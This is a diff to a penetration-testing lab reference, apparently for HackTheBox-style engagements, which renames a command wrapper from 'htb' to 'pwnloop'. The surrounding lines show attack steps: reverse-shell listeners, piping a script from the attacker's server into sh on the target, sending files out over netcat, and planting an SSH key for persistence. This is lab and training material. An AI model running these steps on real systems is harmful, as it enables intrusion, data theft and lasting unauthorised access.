@@ -5,7 +5,7 @@
 Payloads must call back to the **tun0** address, not the container's Docker IP.
 
 ```bash
-LHOST=$(htb x "ip -4 -o addr show tun0 | awk '{print \$4}' | cut -d/ -f1")
+LHOST=$(pwnloop x "ip -4 -o addr show tun0 | awk '{print \$4}' | cut -d/ -f1")
 ```
 
 ## Listener
@@ -14,8 +14,8 @@ Start it before firing the payload. Run it in a background shell so you can keep
 working while it waits.
 
 ```bash
-htb x "rlwrap nc -lvnp 4444" &      # rlwrap gives arrow keys/history if present
-htb x "nc -lvnp 4444" &
+pwnloop x "rlwrap nc -lvnp 4444" &      # rlwrap gives arrow keys/history if present
+pwnloop x "nc -lvnp 4444" &
 ```
 
 ## Reverse shells
@@ -60,7 +60,7 @@ any interactive prompt, and tab completion is dead.
 ## File transfer to the target
 
 ```bash
-htb x "cd /engagements/$NAME/www && python3 -m http.server 8000" &
+pwnloop x "cd /engagements/$NAME/www && python3 -m http.server 8000" &
 # on target:
 curl http://LHOST:8000/linpeas.sh | sh
 wget http://LHOST:8000/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
@@ -74,7 +74,7 @@ engagement's `www/` directory rather than downloading from the internet.
 
 No outbound HTTP from the target? Use SMB:
 ```bash
-htb x "impacket-smbserver share /engagements/$NAME/www -smb2support"
+pwnloop x "impacket-smbserver share /engagements/$NAME/www -smb2support"
 # target: copy \\LHOST\share\file.exe .
 ```
 
@@ -82,7 +82,7 @@ htb x "impacket-smbserver share /engagements/$NAME/www -smb2support"
 
 ```bash
 # attacker
-htb x "nc -lvnp 9001 > /engagements/$NAME/loot/out.bin"
+pwnloop x "nc -lvnp 9001 > /engagements/$NAME/loot/out.bin"
 # target
 nc LHOST 9001 < /path/file
 # or, small files, straight through the shell
@@ -96,9 +96,9 @@ to `~/.ssh/authorized_keys` if SSH is open. It survives shell drops and makes
 the rest of the engagement far less fragile.
 
 ```bash
-htb x "ssh-keygen -t ed25519 -N '' -f /engagements/$NAME/loot/id_ed25519"
+pwnloop x "ssh-keygen -t ed25519 -N '' -f /engagements/$NAME/loot/id_ed25519"
 # target: echo '<pubkey>' >> ~/.ssh/authorized_keys
-htb x "ssh -i /engagements/$NAME/loot/id_ed25519 user@$T"
+pwnloop x "ssh -i /engagements/$NAME/loot/id_ed25519 user@$T"
 ```
 
 Log the flag as soon as you can read it:
